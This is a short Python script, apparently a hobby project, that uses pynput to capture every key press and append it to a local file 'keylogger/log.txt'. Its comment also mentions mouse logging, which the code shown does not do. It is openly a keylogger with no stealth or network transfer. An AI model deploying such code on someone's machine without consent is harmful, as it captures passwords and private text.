from controller_keyboard import control_keyboard
from controller_mouse import control_mouse
from pynput.keyboard import Listener
# Note: pynput cannot control the keyboard and mouse within the same file, this requires double imports

# Program stores key strokes and mouse movement within log file

# Append
def appendtofile(key):
    data = str(key)
    with open('keylogger/log.txt','a') as f:
        f.write(data)



with Listener(on_press=appendtofile) as l:
    l.join()

